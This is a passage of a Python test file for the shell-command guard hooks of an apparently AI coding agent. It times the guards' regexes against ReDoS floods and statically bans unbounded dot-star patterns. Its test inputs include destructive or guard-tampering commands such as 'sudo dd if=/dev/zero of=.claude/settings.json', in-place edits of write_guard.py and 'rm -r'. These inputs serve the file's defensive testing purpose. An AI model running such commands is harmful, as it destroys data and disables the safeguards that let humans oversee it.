    from _bash_patterns import _candidate_paths_from_powershell  # noqa: E402

    command = (verb + " ") * (28000 // (len(verb) + 1))
    signal.signal(signal.SIGALRM, _alarm)
    signal.setitimer(signal.ITIMER_REAL, _CHAIN_CEILING_MS / 1000.0)
    t = time.time()
    try:
        _candidate_paths_from_powershell(command)
        elapsed_ms = (time.time() - t) * 1000
    except _Timeout:
        pytest.fail(
            f"_candidate_paths_from_powershell exceeded {_CHAIN_CEILING_MS}ms on a repeated {verb!r} "
            f"command -- verb-regex ReDoS class ({name}) regressed"
        )
    finally:
        signal.setitimer(signal.ITIMER_REAL, 0)
    assert elapsed_ms < _CHAIN_CEILING_MS


@pytest.mark.parametrize(
    "name,pattern,command,expected",
    [
        ("sed_inplace", _SED_INPLACE_RE,
         "sed -i 's/a/b/' tools/cc/hooks/write_guard.py",
         "tools/cc/hooks/write_guard.py"),
        # The bound must not regress the realistic `sudo dd of=...` prefix.
        ("dd_of", _DD_OF_RE,
         "sudo dd if=/dev/zero of=.claude/settings.json", ".claude/settings.json"),
        ("tar_c", _TAR_C_RE, "tar xf a.tar -C .claude/", ".claude/"),
        ("git_dashdash", _GIT_CHECKOUT_DASHDASH_RE,
         "git checkout origin/main feat -- .claude/settings.json",
         ".claude/settings.json"),
        ("ps_path_flag", _PS_PATH_FLAG_RE,
         "Set-Content -Path .claude/settings.json -Value x",
         ".claude/settings.json"),
    ],
)
def test_verb_extraction_regex_still_matches(name, pattern, command, expected):
    """The span bound must not regress legitimate target extraction (group 1)."""
    m = pattern.search(command)
    assert m is not None, f"{name} no longer matches: {command!r}"
    assert m.group(1) == expected, (
        f"{name} extracted {m.group(1)!r}, expected {expected!r}"
    )


#: Every consumer that runs the binding pre-pass on a Bash command: the
#: extractor, and since DEF-846 the walls (the dangerous-reason leg) and the
#: nudge's deferral to them. The walls ran it on the UNCAPPED text, four times
#: per tier, until both reviews measured a flood of bindings past the hook
#: timeout; `_wall_readings` now caps its input and is cached per text.
_PREPASS_CONSUMERS = [
    ("candidate_paths_from_bash", lambda cmd, root: _candidate_paths_from_bash(cmd)),
    ("bash_dangerous_reason", lambda cmd, root: write_guard._bash_dangerous_reason(cmd, root)),
    ("speedbump_rmrf", lambda cmd, root: _speedbump._pred_rmrf("Bash", {"command": cmd}, root)),
]


@pytest.mark.parametrize("name, consumer", _PREPASS_CONSUMERS, ids=[c[0] for c in _PREPASS_CONSUMERS])
def test_var_expansion_prepass_bounded_by_cap(name, consumer, tmp_path):
    """`_expand_simple_var_assignments` is O(distinct_names * len) — a documented
    known-minor (pre-TP-169). It is NOT a fail-open because `_cap_for_scan` trims
    the input to 32KB before it runs, holding the worst case to a few hundred ms
    (measured ~130ms in the extractor, well under the 5s hook timeout). This pin
    guards that bound for EVERY consumer (DEF-846's review: the walls read it
    uncapped, 16 times the cost at HEAD with bindings): if a future change
    removes the cap or balloons the constant, a many-distinct-VAR command would
    regress toward a multi-second stall. Asserts the walker ceiling (about
    500 ms here at HEAD; see the class note above the chain row), far under
    the 5s timeout. POSIX-only (signal.alarm)."""
    if not hasattr(signal, "SIGALRM"):
        pytest.skip("signal.alarm not available on this platform")

    # ~64KB raw (cap engages) of distinct `Vn=x` assignments + `${Vn}` refs —
    # the O(distinct_names * len) worst case -- then a delete of a bound name,
    # so the walls judge the inlined reading rather than stepping aside.
    assigns, refs, i, size = [], [], 0, 0
    while size < 64000:
        nm = f"V{i}"
        assigns.append(f"{nm}=x")
        refs.append("${%s}" % nm)
        size += len(nm) + 8
        i += 1
    command = ";".join(assigns) + ";" + " ".join(refs) + "; rm -r $V0"

    signal.signal(signal.SIGALRM, _alarm)
    signal.setitimer(signal.ITIMER_REAL, _WALKER_CEILING_MS / 1000.0)
    t = time.time()
    try:
        consumer(command, tmp_path)
        elapsed_ms = (time.time() - t) * 1000
    except _Timeout:
        pytest.fail(
            f"{name} exceeded {_WALKER_CEILING_MS}ms on a many-distinct-VAR command — the "
            "_cap_for_scan bound on _expand_simple_var_assignments regressed "
            "(TP-169 §13 #5 known-minor; DEF-846 for the walls)"
        )
    finally:
        signal.setitimer(signal.ITIMER_REAL, 0)
    assert elapsed_ms < _WALKER_CEILING_MS, (name, elapsed_ms)


def _binding_start_flood_probes() -> list[tuple[str, str]]:
    """The binding pre-pass's anchor runs (DEF-847), each against a failing
    tail. DERIVED where the fragment names words: the declaration builtins
    are read out of `_DECL_BUILTIN_PREFIX`, so a builtin added later is
    flooded without anyone enrolling it. The separators and the exec openers
    are HAND-LISTED (a character class cannot be read back into spellings
    honestly), so the separator group is PINNED below: a separator added to
    `_BINDING_START` reds this list until it is enrolled here (the
    failure-mode review; STANDING_PRINCIPLES §14, the expectation derived).
    The blank-run rows are the shape the horizontal-only class after a
    separator exists for: a whitespace class there re-scanned a run of
    blank lines once per newline."""
    import re as _re
    import _bash_patterns

    start = _bash_patterns._BINDING_START
    assert start.startswith(r"(?:(?:^|;|\&\&|\|\||\n|(?<!\$)[{(])"), (
        "_BINDING_START's separator group changed: enrol the new anchor's "
        "flood below, then update this pin"
    )
    builtins = _re.findall(r"[a-z]{4,}", _bash_patterns._DECL_BUILTIN_PREFIX)
    assert builtins, "the declaration-builtin fragment names no builtin"
    n = _WORST_CASE_BODY_LEN
    probes: list[tuple[str, str]] = []
    for sep, spelled in (("\n", "\\n"), ("{", "{"), ("(", "("), ("||", "\\|\\|"),
                         ("&&", "\\&\\&"), (";", ";")):
        assert spelled in start, f"{sep!r} is no longer a binding start"
        probes.append((f"run-of-{sep!r}", sep * (n // len(sep)) + "zzz"))
        probes.append((f"{sep!r}-then-blanks", sep + " " * n + "zzz"))
    probes.append(("blank-lines", "\n \n" * (n // 3) + "zzz"))
    for word in builtins:
        probes.append((f"run-of-{word}", (word + " ") * (n // (len(word) + 1)) + "zzz"))
        probes.append((f"{word}-flag-run", word + " -a" * (n // 3) + " zzz"))
        probes.append((f"{word}-then-blanks", word + " " * n + "zzz"))
    for opener in ("eval ", "sh -c '", 'bash -c "', "eval '"):
        probes.append((f"run-of-{opener!r}", opener * (n // len(opener)) + "zzz"))
    # the child-scope events (DEF-848's lane): a scope opened per paren with
    # many bindings in force -- copying the bindings per scope was the
    # quadratic shape the undo journal replaces -- and a run of `-c` programs,
    # each a scope of its own, each rebinding the name
    probes.append(("bindings-then-paren-run",
                   "".join(f"a{k}=x;" for k in range(n // 16)) + "(" * (n // 2) + "$a1"))
    probes.append(("scoped-rebinding-run", "a=x; " + "sh -c 'a=y; echo $a'; " * (n // 24)))
    return probes


_BINDING_START_FLOODS = _binding_start_flood_probes()


@pytest.mark.parametrize("shape, probe", _BINDING_START_FLOODS,
                         ids=[s for s, _ in _BINDING_START_FLOODS])
def test_binding_pre_pass_linear_on_its_anchor_runs(shape, probe):
    """DEF-847 widened where a binding can start (every name case, the
    declaration builtins, a newline, `||`, a brace or paren, a `-c` or `eval`
    program). Both pre-pass patterns and the pre-pass itself stay under the
    per-pattern budget on a long run of each anchor. POSIX-only
    (signal.alarm)."""
    if not hasattr(signal, "SIGALRM"):
        pytest.skip("signal.alarm not available on this platform")
    import _bash_patterns

    signal.signal(signal.SIGALRM, _alarm)
    signal.setitimer(signal.ITIMER_REAL, _CI_SAFE_BUDGET_MS / 1000.0)
    t = time.time()
    try:
        list(_bash_patterns._VAR_ANY_ASSIGN_RE.finditer(probe))
        _bash_patterns._VAR_ASSIGN_RE.search(probe)
        _bash_patterns._expand_simple_var_assignments(probe)
    except _Timeout:
        pytest.fail(f"the binding pre-pass exceeded {_CI_SAFE_BUDGET_MS}ms on {shape}")
    finally:
        signal.setitimer(signal.ITIMER_REAL, 0)
    elapsed_ms = (time.time() - t) * 1000
    assert elapsed_ms < _CI_SAFE_BUDGET_MS, f"{shape}: {elapsed_ms:.1f}ms"


def test_ps_var_expansion_prepass_bounded():
    """The PowerShell twin (`_expand_simple_ps_var_assignments`, DEF-801) is
    not capped first -- the PowerShell leg masks before it caps, so a span
    the cap cut in two must never be masked -- and bounds itself instead:
    it stands down past the scan cap and abandons an expansion that would
    add more than the cap. Three floods under the walker ceiling the Bash row also asserts: many
    distinct bindings and references just under the cap (the names * len
    shape), a quote flood against the binding regex's `''` escape with no
    terminator, and one short name bound to a long value and referenced
    thousands of times (the growth guard, on both twins: the Bash one built
    the megabytes and threw them away until 2026-09-15). POSIX-only
    (signal.alarm)."""
    if not hasattr(signal, "SIGALRM"):
        pytest.skip("signal.alarm not available on this platform")
    from _bash_patterns import (  # noqa: E402
        _BASH_COMMAND_CAP, _candidate_paths_from_bash, _candidate_paths_from_powershell,
        _expand_simple_ps_var_assignments, _expand_simple_var_assignments,
    )
    assigns, refs, i, size = [], [], 0, 0
    while size < _BASH_COMMAND_CAP - 2048:
        nm = f"v{i}"
        assigns.append(f"${nm}='x'")
        refs.append("${%s}" % nm)
        size += 2 * len(nm) + 10
        i += 1
    floods = {
        "distinct names": ";".join(assigns) + ";" + " ".join(refs),
        "quote flood": ";$p=" + "'" * 30000,
        "growth": "$p='" + "a" * 20000 + "'; " + " ".join(["$p"] * 3000),
        # many small segments, each under the budget on its own and the sum
        # far past it: the shape the code review drove against the Bash twin
        # (32 KB -> 28 MB and 52 s under a per-segment budget, 2026-09-15)
        "growth across segments": "$a='" + "x" * 8000 + "'; " + "$a; $x=1; " * 1500,
    }
    growth_bash = {
        "growth": "P=" + "a" * 20000 + "; " + " ".join(["$P"] * 3000),
        "growth across segments": "A='" + "x" * 8000 + "'; " + "$A; X=1; " * 1500,
    }
    signal.signal(signal.SIGALRM, _alarm)
    for label, command in floods.items():
        signal.setitimer(signal.ITIMER_REAL, _WALKER_CEILING_MS / 1000.0)
        t = time.time()
        try:
            _candidate_paths_from_powershell(command)
            elapsed_ms = (time.time() - t) * 1000
        except _Timeout:
            pytest.fail(f"_candidate_paths_from_powershell exceeded {_WALKER_CEILING_MS}ms on the {label} flood")
        finally:
            signal.setitimer(signal.ITIMER_REAL, 0)
        assert elapsed_ms < _WALKER_CEILING_MS, (label, elapsed_ms)
    for label, command in growth_bash.items():
        signal.setitimer(signal.ITIMER_REAL, _WALKER_CEILING_MS / 1000.0)
        t = time.time()
        try:
            _candidate_paths_from_bash(command)
            elapsed_ms = (time.time() - t) * 1000
        except _Timeout:
            pytest.fail(f"_candidate_paths_from_bash exceeded {_WALKER_CEILING_MS}ms on the {label} flood")
        finally:
            signal.setitimer(signal.ITIMER_REAL, 0)
        assert elapsed_ms < _WALKER_CEILING_MS, (label, elapsed_ms)
    # the growth guard stood down on both twins rather than expanding -- one
    # budget across the whole command, not one per segment
    for label in ("growth", "growth across segments"):
        assert _expand_simple_ps_var_assignments(floods[label]) == floods[label], label
        assert _expand_simple_var_assignments(growth_bash[label]) == growth_bash[label], label


# ── the prompt router's patterns ─────────────────────────────────────────────
#
# `task_router._classify` runs on EVERY prompt the user types, over text no cap
# trims, and reads it through three patterns: the question opener, the
# read-only opener and the command-reference stripper. Each flood below aims at
# one quantifier: a run of unclosed backticks at the span arm, a repeated
# runner name at the stripper's retry, a long blank run at each bounded
# whitespace arm, and unclosed spans behind a live keyword. Timed here because
# this is one of the files that run serially: a wall-clock bound in the
# router's own test file would false-fail under the parallel run.

_ROUTER_FLOODS = [
    ("backticks", "`" * _WORST_CASE_BODY_LEN),
    ("npm_run", ("npm run " * (_WORST_CASE_BODY_LEN // 8))[:_WORST_CASE_BODY_LEN]),
    ("pnpm_blank_run", "pnpm" + " " * (_WORST_CASE_BODY_LEN - 5) + "x"),
    ("make", ("make " * (_WORST_CASE_BODY_LEN // 5))[:_WORST_CASE_BODY_LEN]),
    ("please_blank_run", "please " + " " * (_WORST_CASE_BODY_LEN - 12) + "check"),
    ("open_spans", "refactor " + "`a" * ((_WORST_CASE_BODY_LEN - 9) // 2)),
]


@pytest.mark.parametrize("label,payload", _ROUTER_FLOODS, ids=[f[0] for f in _ROUTER_FLOODS])
def test_prompt_router_classifies_a_flood_within_the_regex_budget(label, payload):
    """Measured 2026-09-29 on a Windows host, median of five: 2.6 to 5.1 ms
    a flood, against the documented 100 ms design budget. The asserted line is
    the CI-safe ceiling this file's regex rows share."""
    import importlib

    task_router = importlib.import_module("task_router")
    t = time.time()
    task_router._classify(payload)
    elapsed_ms = (time.time() - t) * 1000
    assert elapsed_ms < _CI_SAFE_BUDGET_MS, (
        f"task_router._classify took {elapsed_ms:.1f}ms on the {label} flood "
        f"({len(payload)} bytes; budget {_CI_SAFE_BUDGET_MS}ms)"
    )


# ── TP-170 §4.1 / §7d: dot-star completeness gate over the hook-runtime regex
#    surface ────────────────────────────────────────────────────────────────
#
# Root cause of the #5 ReDoS whack-a-mole: every budget test above pins a
# hand-curated target list (the ``_bash_patterns`` extraction regexes). A NEW
# dot-star regex compiled in any OTHER hook file was never forced into review —
# and two shipped live and quadratic at hook runtime on model-emitted commands:
# ``write_guard.py`` ``Remove-Item\s+.*-Recurse.*-Force`` and ``plan_guard.py``
# ``_SHELL_MUTATE_RE``'s ``\bperl\b.*-\w*p\w*i\b`` arm. The ``_bash_patterns``-
# scoped budget never saw them. This gate closes the CLASS rather than the two
# instances: it statically walks every ``re.compile(...)`` in
# ``tools/cc/hooks/*.py`` — the complete hook-runtime regex surface (hooks carry
# zero ``espalier`` imports per the isolation rule, so no ``espalier`` regex ever
# executes inside a hook event) — and fails if any reconstructed pattern carries
# an UNBOUNDED dot-quantifier (``.*`` / ``.+`` / ``.*?`` / ``.+?``) that is not in
# ``_DOTSTAR_ALLOWLIST`` with a ReDoS-review reason. ``.{0,N}``-bounded spans are
# exempt — that is exactly the §7b/§7c fix shape.
#
# Scope (honest limitation): the gate catches the dot-star family — the shape
# that bit in #5 (a ``.*`` span scanning toward an ABSENT required token,
# super-linear on a repeated token), spelled bare or as an unbounded repeat over
# a group whose iteration can begin with a bare dot, ``(?:(?!x).)+?`` (DEF-5022:
# the recall engine's first comment strip took 84 s on an 86 KB paragraph that
# way). An escape arm, a required character then a dot, is flagged only when a
# sibling arm can begin with the same character: ``(?:\\.|[^"])*`` splits a run
# of backslashes two ways at each one and is exponential, while the shipped
# ``(?:\\.|[^"\\])*`` (74 hook patterns carry the idiom) leaves the backslash to
# the escape arm and is linear. It does NOT catch nested-quantifier ReDoS
# (``(a+)+``) or non-dot unbounded quantifiers (``\w*``, ``[^x]*``) — including
# the ``[^x]*TOKEN[^x]*`` double-negated-class spelling, which is the SAME
# ReDoS class in a different costume (see ``_MARKER_SUBSTRING_RE`` below, found
# live by the TP-170 §7 verification pass). Those remain the job of the
# per-pattern SIGALRM budget tests, which must EXPLICITLY enumerate each such
# pattern — there is no automatic sweep, so a new ``[^x]*TOKEN[^x]*`` hook regex
# needs a budget pin added by hand. The two layers are complementary; neither
# substitutes for the other. An auto-fuzz gate was evaluated and REJECTED (§7d): a
# generic fuzzer false-negatives on ``Remove-Item ...-Recurse`` because it cannot
# reconstruct the dashed-token worst case. A static dot-star ban is the reliable,
# tractable source-fix.

_HOOKS_DIR = Path(__file__).resolve().parent.parent / "tools" / "cc" / "hooks"

# (filename, EXACT reconstructed pattern) -> ReDoS-review reason. An entry is an
# attestation that a human walked the pattern and bounded its worst case. The key
# is the pattern TEXT (not a line number) so a benign edit elsewhere in the file
# never false-fails the gate — but if the regex itself changes, the key no longer
# matches and the gate re-fails, forcing re-review of the modified regex (the
# intended friction).
_DOTSTAR_ALLOWLIST: dict[tuple[str, str], str] = {
    ("_recall.py", r"^###[ \t]+(\S.*)$"): (
        "TP-187: anchored ^...$ single-line `### ` coinage-heading capture, "
        "no DOTALL, greedy `.*` runs "
        "to end-of-line with only `$` after it -> linear. Runs over bounded "
        "FAILURE_MODES.md headings, never model-emitted input."
    ),
}

# Unbounded dot-quantifier `.` (metachar) immediately followed by `*`/`+` (with
# optional lazy `?`). `.{0,N}` is exempt (the `.` is followed by `{`). We detect
# escape-aware rather than with a one-char lookbehind: a single `(?<!\\)` would
# MISS `\\.*` (a literal backslash `\\` then a genuine dot-metachar) — the gate's
# whole point is completeness, so that blind spot is unacceptable. The cleaner
# `_strip_escapes_and_classes` consumes each backslash-escaped PAIR (`\\`, `\.`,
# `\s`, …) and each `[...]` character-class span (where `.`/`*` are literals), so
# only true metacharacters survive to the final scan.
_BARE_DOTSTAR_RE = re.compile(r"\.[*+]\??")


def _strip_escapes_and_classes(pattern: str) -> str:
    out: list[str] = []
    i, n = 0, len(pattern)
    while i < n:
        c = pattern[i]
        if c == "\\":  # escaped pair — drop both chars (handles \\, \., \s, …)
            i += 2
            continue
        if c == "[":  # character-class span — `.`/`*` inside are literals
            j = i + 1
            if j < n and pattern[j] == "^":
                j += 1
            if j < n and pattern[j] == "]":  # literal `]` as first class member
                j += 1
            while j < n and pattern[j] != "]":
                j += 2 if pattern[j] == "\\" else 1
            i = j + 1
            continue
        out.append(c)
        i += 1
    return "".join(out)


def _pattern_has_unbounded_dotstar(pattern: str) -> bool:
    """The text scan above, or an unbounded repeat whose iteration can begin
    with a bare dot (:func:`_repeat_can_begin_with_a_dot`). The text scan sees
    a dot only when ``*`` or ``+`` follows it, so a dot in a group the
    quantifier sits on, ``(?:(?!x).)+?``, passed it (DEF-5022); a pattern the
    parser refuses keeps the text scan alone (it fails at the hook's import
    anyway)."""
    if _BARE_DOTSTAR_RE.search(_strip_escapes_and_classes(pattern)):
        return True
    from re import _parser as sre_parse

    try:
        parsed = sre_parse.parse(pattern)
    except re.error:
        return False
    return _repeat_can_begin_with_a_dot(parsed)


def _iteration_begins_with_a_dot(seq) -> tuple[bool, bool]:
    """``(can a match of seq begin with a bare dot, can seq match empty)``.

    The first item that consumes decides: a dot is True; a literal, a class,
    a category or a group reference is False. A zero-width item (an anchor, a
    lookaround) and a nullable one (``x?``, ``(?:a|)``) are looked through, so
    ``(?:(?!x).)`` and ``(?:x?.)`` begin with a dot and ``(?:\\\\.|[^"\\\\])``,
    whose dot only follows a required backslash, does not; whether such an
    escape arm overlaps a sibling is :func:`_escape_arm_overlaps_a_sibling`'s
    question."""
    from re import _parser as sre_parse

    repeats = {sre_parse.MAX_REPEAT, sre_parse.MIN_REPEAT}
    if hasattr(sre_parse, "POSSESSIVE_REPEAT"):
        repeats.add(sre_parse.POSSESSIVE_REPEAT)
    atomic = getattr(sre_parse, "ATOMIC_GROUP", None)
    for op, av in seq:
        if op is sre_parse.ANY:
            return True, False
        if op in (sre_parse.ASSERT, sre_parse.ASSERT_NOT, sre_parse.AT):
            continue
        if op in repeats:
            if av[1] == 0:  # x{0} consumes nothing
                continue
            begins, nullable = _iteration_begins_with_a_dot(av[2])
            heads = [(begins, nullable or av[0] == 0)]
        elif op is sre_parse.SUBPATTERN:
            heads = [_iteration_begins_with_a_dot(av[-1])]
        elif op is atomic:
            heads = [_iteration_begins_with_a_dot(av)]
        elif op is sre_parse.BRANCH:
            heads = [_iteration_begins_with_a_dot(branch) for branch in av[1]]
        elif op is sre_parse.GROUPREF_EXISTS:
            heads = [_iteration_begins_with_a_dot(av[1]),
                     _iteration_begins_with_a_dot(av[2]) if av[2] is not None else (False, True)]
        else:
            return False, False
        if any(begins for begins, _ in heads):
            return True, False
        if not any(nullable for _, nullable in heads):
            return False, False
    return False, True


#: Second characters an escape arm's sibling is tried with, after the escape
#: character itself: a sibling that takes the escape character takes it here.
_ESCAPE_SIBLING_TAILS = ("", "a", " ", '"', "'", "\\", "`", "\n")


def _escape_arm_overlaps_a_sibling(body) -> bool:
    """Whether a repeated alternation holds an escape arm, a literal ``c``
    then a bare dot, beside a sibling arm that can also begin with ``c``.

    ``(?:\\\\.|[^"])*`` is exponential: ``[^"]`` takes the backslash too, so
    a run of backslashes splits two ways at every one (0.14 to 49.8 ms from
    16 to 28 backslashes, air 0effd7). ``(?:\\\\.|[^"\\\\])*``, the shipped
    form, is linear, since the class leaves the backslash to the escape arm.
    A sibling that cannot be compiled alone (a group reference) is not
    counted."""
    from re import _compiler as sre_compile
    from re import _parser as sre_parse

    seq = list(body)
    while len(seq) == 1 and seq[0][0] is sre_parse.SUBPATTERN:
        seq = list(seq[0][1][-1])
    if len(seq) != 1 or seq[0][0] is not sre_parse.BRANCH:
        return False
    arms = seq[0][1][1]
    for i, arm in enumerate(arms):
        if len(arm) < 2 or arm[0][0] is not sre_parse.LITERAL or arm[1][0] is not sre_parse.ANY:
            continue
        escape = chr(arm[0][1])
        for j, sibling in enumerate(arms):
            if j == i:
                continue
            try:
                alone = sre_compile.compile(sre_parse.SubPattern(sre_parse.State(), list(sibling)), 0)
            except (re.error, TypeError, ValueError):
                continue
            if any(alone.match(escape + tail) for tail in _ESCAPE_SIBLING_TAILS):
                return True
    return False


def _repeat_can_begin_with_a_dot(seq) -> bool:
    """Whether any unbounded repeat in the parsed ``seq``, at any depth, can
    begin an iteration with a bare dot (``.*`` itself, and the group form
    ``(?:(?!x).)+?`` the text scan cannot see) or repeats an escape arm a
    sibling arm overlaps (``(?:\\\\.|[^"])*``) (DEF-5022)."""
    from re import _constants as sre_constants
    from re import _parser as sre_parse

    repeats = {sre_parse.MAX_REPEAT, sre_parse.MIN_REPEAT}
    if hasattr(sre_parse, "POSSESSIVE_REPEAT"):
        repeats.add(sre_parse.POSSESSIVE_REPEAT)
    for op, av in seq:
        if op in repeats:
            if av[1] is sre_constants.MAXREPEAT and (
                    _iteration_begins_with_a_dot(av[2])[0] or _escape_arm_overlaps_a_sibling(av[2])):
                return True
            inner = [av[2]]
        elif op is sre_parse.SUBPATTERN:
            inner = [av[-1]]
        elif op is getattr(sre_parse, "ATOMIC_GROUP", None):
            inner = [av]
        elif op is sre_parse.BRANCH:
            inner = list(av[1])
        elif op in (sre_parse.ASSERT, sre_parse.ASSERT_NOT):
            inner = [av[1]]
        elif op is sre_parse.GROUPREF_EXISTS:
            inner = [av[1]] + ([av[2]] if av[2] is not None else [])
        else:
            continue
        if any(_repeat_can_begin_with_a_dot(sub) for sub in inner):
            return True
    return False


class _UnresolvablePattern(Exception):
    """Raised when a re.compile() argument cannot be statically reconstructed."""


def _module_level_strings(tree: ast.Module) -> dict[str, ast.expr]:
    """Map module-level ``NAME = <expr>`` so the reconstructor can resolve a
    regex assembled from string constants (``_GIT_PUSH = ... ; X = _GIT_PUSH + ...``)."""
    env: dict[str, ast.expr] = {}
    for node in tree.body:
        if (
            isinstance(node, ast.Assign)
            and len(node.targets) == 1
            and isinstance(node.targets[0], ast.Name)
        ):
            env[node.targets[0].id] = node.value
    return env


_SIBLING_ENV_CACHE: dict[str, dict[str, ast.expr]] = {}


def _sibling_module_strings(module_name: str) -> dict[str, ast.expr]:
    """Module-level assignments of a SIBLING hook module, for cross-module
    fragment references.

    Hooks share regex fragments by importing a sibling
    (``_speedbump`` composes ``_bash_patterns._CMD_POS``), which reaches the
    reconstructor as an ``ast.Attribute`` it could not resolve — so the gate
    failed CLOSED on four real, safe patterns. Resolving the sibling keeps the
    gate's guarantee (it still PROVES the absence of a dot-star) instead of
    forcing an allowlist entry, which would have waived the proof entirely.

    Fails closed for anything that is not a sibling hook file.
    """
    if module_name not in _SIBLING_ENV_CACHE:
        sibling = _HOOKS_DIR / f"{module_name}.py"
        if not sibling.is_file():
            raise _UnresolvablePattern(f"not a sibling hook module: {module_name!r}")
        _SIBLING_ENV_CACHE[module_name] = _module_level_strings(
            ast.parse(sibling.read_text(encoding="utf-8"))
        )
    return _SIBLING_ENV_CACHE[module_name]


def _reconstruct_pattern(node: ast.expr, env: dict[str, ast.expr], depth: int = 0) -> str:
    """Best-effort static value of a re.compile() pattern argument.

    Resolves: str literals, ``+`` concatenation, module-level Name references
    (recursively), and f-strings whose interpolations are ``re.escape(...)``
    (escaped output is provably dot-star-free, so it contributes the empty
    string). Anything else — a genuinely dynamic interpolation, a non-string
    constant, an unresolved Name — raises so the gate forces an explicit review
    (it cannot prove the absence of a dot-star it cannot see)."""
    # A runaway bound, not a budget: each `+` term of a left-nested chain is a
    # level, and C76's carrier composition (the lead run over the wrapper
    # steps over the roster) took `_TAIL_LOOP_REMOVE_RE` and the PowerShell
    # piped reader past 50, both reconstructing whole at 100 (2026-11-07).
    if depth > 100:
        raise _UnresolvablePattern("reconstruction too deep")
    if isinstance(node, ast.Constant) and isinstance(node.value, str):
        return node.value
    if isinstance(node, ast.BinOp) and isinstance(node.op, ast.Add):
        return (
            _reconstruct_pattern(node.left, env, depth + 1)
            + _reconstruct_pattern(node.right, env, depth + 1)
        )
    if isinstance(node, ast.Name):
        if node.id in env:
            return _reconstruct_pattern(env[node.id], env, depth + 1)
        raise _UnresolvablePattern(f"unresolved name {node.id!r}")
    if isinstance(node, ast.Attribute) and isinstance(node.value, ast.Name):
        # `_bash_patterns._CMD_POS` — a fragment shared from a sibling hook
        # module. Resolved in the SIBLING's own env, not this file's.
        sibling_env = _sibling_module_strings(node.value.id)
        if node.attr not in sibling_env:
            raise _UnresolvablePattern(
                f"unresolved attribute {node.value.id}.{node.attr}"
            )
        return _reconstruct_pattern(sibling_env[node.attr], sibling_env, depth + 1)
    if isinstance(node, ast.JoinedStr):  # f-string
        parts: list[str] = []
        for piece in node.values:
            if isinstance(piece, ast.Constant) and isinstance(piece.value, str):
                parts.append(piece.value)
            elif isinstance(piece, ast.FormattedValue):
                call = piece.value
                is_re_escape = (
                    isinstance(call, ast.Call)
                    and isinstance(call.func, ast.Attribute)
                    and call.func.attr == "escape"
                    and isinstance(call.func.value, ast.Name)
                    and call.func.value.id == "re"
                )
                if is_re_escape:
                    parts.append("")  # re.escape(...) yields no dot-star
                else:
                    raise _UnresolvablePattern("dynamic f-string interpolation")
            else:
                raise _UnresolvablePattern("unrecognized f-string component")
        return "".join(parts)
    raise _UnresolvablePattern(f"unsupported node {type(node).__name__}")


def _re_compile_bindings(tree: ast.Module) -> tuple[set[str], set[str]]:
    """Discover every name under which this module can reach ``re.compile``.

    A gate that only recognizes the literal ``re.compile`` spelling has clean
    bypasses (``import re as X``; ``from re import compile``; a module-level
    rebind ``_c = re.compile``) — a future hook could ship an unbounded dot-star
    through any of them and the gate would pass GREEN. We resolve the binding
    instead of pinning the name. Returns ``(re_module_names, compile_call_names)``:
    names ``X`` where ``X.compile`` is ``re.compile``, and bare names ``Y`` where
    ``Y(...)`` is ``re.compile(...)``."""
    re_module_names: set[str] = set()
    compile_call_names: set[str] = set()
    for node in ast.walk(tree):  # walk (not just body) — catches scoped imports
        if isinstance(node, ast.Import):
            for alias in node.names:
                if alias.name == "re":
                    re_module_names.add(alias.asname or "re")
        elif isinstance(node, ast.ImportFrom) and node.module == "re":
            for alias in node.names:
                if alias.name == "compile":
                    compile_call_names.add(alias.asname or "compile")
    for node in tree.body:  # module-level rebind: Z = re.compile / Z = X.compile
        if (
            isinstance(node, ast.Assign)
            and len(node.targets) == 1
            and isinstance(node.targets[0], ast.Name)
            and isinstance(node.value, ast.Attribute)
            and node.value.attr == "compile"
            and isinstance(node.value.value, ast.Name)
            and node.value.value.id in re_module_names
        ):
            compile_call_names.add(node.targets[0].id)
    return re_module_names, compile_call_names


def _compile_pattern_arg(node: ast.Call) -> ast.expr:
    """The pattern argument of a compile call — positional or ``pattern=`` kwarg.
    Raises ``_UnresolvablePattern`` if neither is present (e.g. a ``*args`` splat)
    so the gate fails CLOSED rather than silently skipping the call."""
    if node.args:
        return node.args[0]
    for kw in node.keywords:
        if kw.arg == "pattern":
            return kw.value
    raise _UnresolvablePattern("no positional or pattern= argument")


#: A hook ``re.compile`` whose pattern is DATA, never a literal, reviewed for
#: ReDoS and exempted from the gate's unresolved-pattern refusal. Keyed by
#: (file, "<enclosing function>:<the argument's source text>") exactly, so a
#: second dynamic compile -- in another function, or of another name -- is
#: still refused (``test_a_second_dynamic_compile_is_not_exempt``), and
#: ``test_every_dynamic_compile_exemption_is_live`` keeps an entry from
#: outliving its call.
_DYNAMIC_COMPILE_ALLOWLIST: dict[tuple[str, str], str] = {
    ("_integrity.py", "_matcher_covers_mutations:matcher"): (
        "TP-476 A-0: _matcher_covers_mutations compiles a PreToolUse matcher read "
        "from the settings file (data: Claude Code itself compiles the same "
        "string on every tool call) and fullmatches it against three fixed tool "
        "names of at most 12 characters, so even an exponential pattern is "
        "bounded to a few thousand steps. Twin of ci_guard._ci_matcher_covers_mutations, "
        "pinned equal by tests/test_ci_guard.py::TestHookSideWiringTwin."
    ),
}


def _iter_hook_compiled_patterns(path: Path, *, with_arg: bool = False):
    """Yield ``(lineno, pattern_or_None)`` for each regex-compile call in a hook
    file, recognizing ``re.compile`` under any binding (alias / from-import /
    rebind) and the ``pattern=`` kwarg form. ``pattern`` is ``None`` when the
    argument is not statically reconstructable (gate then fails closed).
    ``with_arg`` adds ``"<enclosing function>:<argument source>"`` as a third
    element (``None`` when the call has no pattern argument at all)."""
    tree = ast.parse(path.read_text(encoding="utf-8"))
    env = _module_level_strings(tree)
    owner: dict[int, str] = {}
    for fn in ast.walk(tree):  # outer first, so the innermost function wins
        if isinstance(fn, (ast.FunctionDef, ast.AsyncFunctionDef)):
            for inner in ast.walk(fn):
                owner[id(inner)] = fn.name
    re_module_names, compile_call_names = _re_compile_bindings(tree)
    for node in ast.walk(tree):
        if not isinstance(node, ast.Call):
            continue
        func = node.func
        is_compile = (
            isinstance(func, ast.Attribute)
            and func.attr == "compile"
            and isinstance(func.value, ast.Name)
            and func.value.id in re_module_names
        ) or (isinstance(func, ast.Name) and func.id in compile_call_names)
        if not is_compile:
            continue
        try:
            arg_src: str | None = (
                f"{owner.get(id(node), '<module>')}:{ast.unparse(_compile_pattern_arg(node))}")
        except _UnresolvablePattern:
            arg_src = None
        try:
            found = (node.lineno, _reconstruct_pattern(_compile_pattern_arg(node), env))
        except _UnresolvablePattern:
            found = (node.lineno, None)
        yield (*found, arg_src) if with_arg else found


def test_every_dynamic_compile_exemption_is_live():
